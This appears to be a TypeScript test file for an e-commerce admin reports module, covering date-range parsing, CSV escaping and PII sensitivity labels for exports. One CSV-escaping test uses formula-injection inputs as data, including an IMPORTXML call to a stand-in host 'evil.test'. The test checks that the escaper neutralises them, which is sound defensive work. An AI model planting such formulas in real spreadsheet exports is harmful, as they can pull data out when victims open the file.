import assert from 'node:assert/strict'
import { describe, it } from 'node:test'

import {
  ADMIN_REPORT_EXPORT_METADATA,
  escapeCsvValue,
  parseAdminReportRange,
} from '@/backend/admin/reports'

type AdminReportMetadataKey = keyof typeof ADMIN_REPORT_EXPORT_METADATA

function fieldNames(type: AdminReportMetadataKey) {
  return ADMIN_REPORT_EXPORT_METADATA[type].fields.map((field) => field.name)
}

function fieldSensitivity(type: AdminReportMetadataKey, name: string) {
  const field = ADMIN_REPORT_EXPORT_METADATA[type].fields.find((item) => item.name === name)
  assert.ok(field, `Expected ${type}.${name} metadata`)
  return field.sensitivity
}

describe('admin report date range parsing', () => {
  it('uses explicit dates and normalizes the end date to end-of-day', () => {
    const range = parseAdminReportRange('2026-01-05T10:15:00', '2026-01-15T12:30:00')

    assert.equal(range.from.getFullYear(), 2026)
    assert.equal(range.from.getMonth(), 0)
    assert.equal(range.from.getDate(), 5)
    assert.equal(range.from.getHours(), 10)
    assert.equal(range.from.getMinutes(), 15)
    assert.equal(range.to.getFullYear(), 2026)
    assert.equal(range.to.getMonth(), 0)
    assert.equal(range.to.getDate(), 15)
    assert.equal(range.to.getHours(), 23)
    assert.equal(range.to.getMinutes(), 59)
    assert.equal(range.to.getSeconds(), 59)
    assert.equal(range.to.getMilliseconds(), 999)
  })

  it('falls back safely for missing dates', () => {
    const before = Date.now()
    const range = parseAdminReportRange()
    const after = Date.now()
    const thirtyDaysMs = 30 * 24 * 60 * 60 * 1000

    assert.ok(range.from.getTime() >= before - thirtyDaysMs - 1000)
    assert.ok(range.from.getTime() <= after - thirtyDaysMs + 1000)
    assert.equal(range.to.getHours(), 23)
    assert.equal(range.to.getMinutes(), 59)
    assert.equal(range.to.getSeconds(), 59)
    assert.equal(range.to.getMilliseconds(), 999)
  })

  it('falls back safely for invalid dates', () => {
    const before = Date.now()
    const range = parseAdminReportRange('not-a-date', 'also-not-a-date')
    const after = Date.now()
    const thirtyDaysMs = 30 * 24 * 60 * 60 * 1000

    assert.ok(range.from.getTime() >= before - thirtyDaysMs - 1000)
    assert.ok(range.from.getTime() <= after - thirtyDaysMs + 1000)
    assert.equal(range.to.getHours(), 23)
    assert.equal(range.to.getMinutes(), 59)
    assert.equal(range.to.getSeconds(), 59)
    assert.equal(range.to.getMilliseconds(), 999)
  })

  it('preserves reversed ranges for route compatibility', () => {
    const range = parseAdminReportRange('2026-02-10T00:00:00', '2026-01-01T00:00:00')

    assert.ok(range.from.getTime() > range.to.getTime())
  })
})

describe('admin report CSV escaping', () => {
  it('quotes commas and double quotes', () => {
    assert.equal(escapeCsvValue('Boilabin, Dhaka'), '"Boilabin, Dhaka"')
    assert.equal(escapeCsvValue('He said "yes"'), '"He said ""yes"""')
  })

  it('escapes spreadsheet formula prefixes', () => {
    assert.equal(escapeCsvValue('=IMPORTXML("https://evil.test")'), `"'=IMPORTXML(""https://evil.test"")"`)
    assert.equal(escapeCsvValue('+8801711222333'), "'+8801711222333")
    assert.equal(escapeCsvValue('  @cmd'), "'  @cmd")
    assert.equal(escapeCsvValue('-SUM(A1:A2)'), "'-SUM(A1:A2)")
    assert.equal(escapeCsvValue('\t=SUM(A1:A2)'), "'\t=SUM(A1:A2)")
  })

  it('handles empty and non-string values without widening the CSV contract', () => {
    assert.equal(escapeCsvValue(null), '')
    assert.equal(escapeCsvValue(undefined), '')
    assert.equal(escapeCsvValue(42), '42')
    assert.equal(escapeCsvValue(false), 'false')
  })

  it('quotes line breaks that could split CSV rows', () => {
    assert.equal(escapeCsvValue('Line one\nLine two'), '"Line one\nLine two"')
    assert.equal(escapeCsvValue('Line one\rLine two'), '"Line one\rLine two"')
  })
})

describe('admin report export sensitivity metadata', () => {
  it('covers the current report export types', () => {
    assert.deepEqual(Object.keys(ADMIN_REPORT_EXPORT_METADATA).sort(), [
      'customers',
      'orders',
      'products',
    ])
  })

  it('preserves the orders CSV field contract and sensitivity categories', () => {
    const orders = ADMIN_REPORT_EXPORT_METADATA.orders

    assert.deepEqual(fieldNames('orders'), [
      'orderNumber',
      'customer',
      'email',
      'status',
      'paymentStatus',
      'total',
      'createdAt',
    ])
    assert.equal(orders.containsCustomerPii, true)
    assert.equal(orders.containsPaymentOrOrderSensitiveData, true)
    assert.equal(orders.containsBusinessSensitiveData, false)
    assert.match(orders.permissionLabel, /order/i)
    assert.match(orders.warningLabel, /customer/i)
    assert.equal(fieldSensitivity('orders', 'customer'), 'customer-pii')
    assert.equal(fieldSensitivity('orders', 'email'), 'customer-pii')
    assert.equal(fieldSensitivity('orders', 'orderNumber'), 'payment-order-sensitive')
    assert.equal(fieldSensitivity('orders', 'paymentStatus'), 'payment-order-sensitive')
    assert.equal(fieldSensitivity('orders', 'total'), 'payment-order-sensitive')
    assert.equal(fieldSensitivity('orders', 'createdAt'), 'non-sensitive-operational')
  })

  it('preserves the products CSV field contract and business sensitivity categories', () => {
    const products = ADMIN_REPORT_EXPORT_METADATA.products

    assert.deepEqual(fieldNames('products'), [
      'name',
      'sku',
      'category',
      'stockQuantity',
      'soldCount',
      'isActive',
    ])
    assert.equal(products.containsCustomerPii, false)
    assert.equal(products.containsPaymentOrOrderSensitiveData, false)
    assert.equal(products.containsBusinessSensitiveData, true)
    assert.match(products.permissionLabel, /business/i)
    assert.match(products.warningLabel, /stock/i)
    assert.equal(fieldSensitivity('products', 'name'), 'non-sensitive-operational')
    assert.equal(fieldSensitivity('products', 'category'), 'non-sensitive-operational')
    assert.equal(fieldSensitivity('products', 'sku'), 'unknown-needs-policy')
    assert.equal(fieldSensitivity('products', 'stockQuantity'), 'business-sensitive')
    assert.equal(fieldSensitivity('products', 'soldCount'), 'business-sensitive')
    assert.equal(fieldSensitivity('products', 'isActive'), 'business-sensitive')
  })

  it('preserves the customers CSV field contract and highest PII risk labels', () => {
    const customers = ADMIN_REPORT_EXPORT_METADATA.customers

    assert.deepEqual(fieldNames('customers'), [
      'name',
      'email',
      'phone',
      'role',
      'isActive',
      'orders',
      'reviews',
      'createdAt',
    ])
    assert.equal(customers.containsCustomerPii, true)
    assert.equal(customers.containsPaymentOrOrderSensitiveData, false)
    assert.equal(customers.containsBusinessSensitiveData, false)
    assert.match(customers.reportSensitivityLabel, /highest pii risk/i)
    assert.match(customers.permissionLabel, /pii/i)
    assert.match(customers.warningLabel, /contact/i)
    assert.equal(fieldSensitivity('customers', 'name'), 'customer-pii')
    assert.equal(fieldSensitivity('customers', 'email'), 'customer-pii')
    assert.equal(fieldSensitivity('customers', 'phone'), 'customer-pii')
    assert.equal(fieldSensitivity('customers', 'orders'), 'customer-pii')
    assert.equal(fieldSensitivity('customers', 'reviews'), 'customer-pii')
    assert.equal(fieldSensitivity('customers', 'role'), 'unknown-needs-policy')
    assert.equal(fieldSensitivity('customers', 'isActive'), 'unknown-needs-policy')
    assert.equal(fieldSensitivity('customers', 'createdAt'), 'unknown-needs-policy')
  })
})
